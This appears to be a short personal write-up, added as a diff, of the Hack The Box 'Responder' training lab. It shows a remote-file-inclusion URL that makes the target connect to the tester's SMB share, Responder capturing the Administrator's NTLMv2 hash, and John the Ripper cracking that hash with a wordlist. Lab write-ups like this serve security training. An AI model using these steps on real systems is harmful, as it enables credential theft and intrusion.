@@ -1,0 +1,33 @@
+Reposnder needs an SMB check or read in order to watch for the NTLM hash validation check
+in this case RFI was used to accomplish this:
+
+http://unika.htb/?page=//10.10.14.90/somefile
+
+┌──(kali㉿kali)-[~/Desktop/boxes/starting_point_htb/responder]
+└─$ sudo vim /etc/responder/Responder.conf 
+                                                                                                                 
+┌──(kali㉿kali)-[~/Desktop/boxes/starting_point_htb/responder]
+└─$ sudo responder -I tun0   
+
+
+
+[SMB] NTLMv2-SSP Client   : 10.129.95.234
+[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:b47d28a4e73c7b4f:04AED8411DCC8BAA8B30C0CE5DC4572C:0101000000000000003BBAE3957ED9014C0DBB75031F46840000000002000800470036003900330001001E00570049004E002D004B00390053005000340049005100440053004E004B0004003400570049004E002D004B00390053005000340049005100440053004E004B002E0047003600390033002E004C004F00430041004C000300140047003600390033002E004C004F00430041004C000500140047003600390033002E004C004F00430041004C0007000800003BBAE3957ED90106000400020000000800300030000000000000000100000000200000B48EF97B12B373B055F02D8C41453A75B51FE66DD213D1453A2B25878F57F8DB0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390030000000000000000000                                                            
+[*] Skipping previously captured hash for RESPONDER\Administrator
+[+] Exiting...
+                                                                                                                 
+┌──(kali㉿kali)-[~/Desktop/boxes/starting_point_htb/responder]
+└─$ echo "Administrator::RESPONDER:b47d28a4e73c7b4f:04AED8411DCC8BAA8B30C0CE5DC4572C:0101000000000000003BBAE3957ED9014C0DBB75031F46840000000002000800470036003900330001001E00570049004E002D004B00390053005000340049005100440053004E004B0004003400570049004E002D004B00390053005000340049005100440053004E004B002E0047003600390033002E004C004F00430041004C000300140047003600390033002E004C004F00430041004C000500140047003600390033002E004C004F00430041004C0007000800003BBAE3957ED90106000400020000000800300030000000000000000100000000200000B48EF97B12B373B055F02D8C41453A75B51FE66DD213D1453A2B25878F57F8DB0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390030000000000000000000" > hash.txt
+                                                                                                                 
+┌──(kali㉿kali)-[~/Desktop/boxes/starting_point_htb/responder]
+└─$ john -w=/usr/share/wordlists/rockyou.txt hash.txt 
+Created directory: /home/kali/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+badminton        (Administrator)     
+1g 0:00:00:00 DONE (2023-05-04 14:47) 3.846g/s 15753p/s 15753c/s 15753C/s adriano..oooooo
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
